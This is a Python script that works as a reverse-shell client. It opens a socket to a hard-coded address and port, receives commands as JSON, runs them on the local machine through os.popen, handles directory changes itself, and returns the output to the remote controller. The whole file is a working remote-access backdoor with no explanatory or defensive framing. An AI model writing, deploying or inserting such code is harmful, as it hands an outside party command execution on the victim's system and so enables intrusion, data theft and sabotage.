import socket
import json
import os

def server(ip, port):
    global conn
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn.connect((ip, port))
    except Exception as e:
        print(f"Failed to connect to server: {e}")
        exit(1)


def send(data):
    try:
        json_data = json.dumps(data)
        conn.send(json_data.encode('utf-8'))
    except Exception as e:
        print(f"Failed to send data: {e}")


def receive():
    json_data = ''
    while True:
        try:
            json_data += conn.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            print("Received invalid data, ignoring...")
        except Exception as e:
            print(f"Failed to receive data: {e}")
            break


def run():
    while True:
        try:
            command = receive()
            # print(command) # for Debugging
            if command == 'exit':
                break
            elif command[:2] == 'cd' and len(command) > 1:
                try:
                    os.chdir(command[3:].strip())
                    result = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    result = f"cd error: {e}"
            else:
                result = os.popen(command).read()
            send(result)
        except Exception as e:
            print(f"Error executing command: {e}")


server('192.168.1.3', 1234)
run(),